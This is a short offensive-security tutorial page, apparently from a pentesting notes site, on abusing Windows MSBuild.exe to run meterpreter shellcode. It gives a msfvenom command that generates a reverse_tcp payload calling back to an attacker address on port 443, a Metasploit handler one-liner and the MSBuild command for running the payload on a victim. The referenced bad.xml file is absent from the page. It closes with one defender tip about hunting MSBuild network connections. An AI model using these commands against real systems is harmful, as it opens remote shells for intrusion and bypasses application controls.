# Using MSBuild to Execute Shellcode in C\#

It's possible to use a native windows binary MSBuild.exe to compile and execute inline C\# code stored in an xml as discovered by [Casey Smith](https://twitter.com/subTee).

## Execution

Generate meterpreter shellode in c\#:

{% code-tabs %}
{% code-tabs-item title="attacker@kali" %}
```csharp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -f csharp
```
{% endcode-tabs-item %}
{% endcode-tabs %}

Insert shellcode into the shellcode variable in linne 46:

{% code-tabs %}
{% code-tabs-item title="bad.xml" %}

Spin up a handler in metasploit to catch your shell:

{% code-tabs %}
{% code-tabs-item title="attacker@kali" %}
```csharp
msfconsole -x "use exploits/multi/handler; set lhost 10.0.0.5; set lport 443; set payload windows/meterpreter/reverse_tcp; exploit"
```
{% endcode-tabs-item %}
{% endcode-tabs %}

Build and execute malicious payload on the victim system using MSBuild:

{% code-tabs %}
{% code-tabs-item title="attacker@victim" %}
```csharp
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\bad\bad.xml
```
{% endcode-tabs-item %}
{% endcode-tabs %}

## Observation

Note that it's MSBuild.exe that will make the TCP connection to the attacker, so as a defender, you should think about hunting for TCP connections initiated by MSBuild.
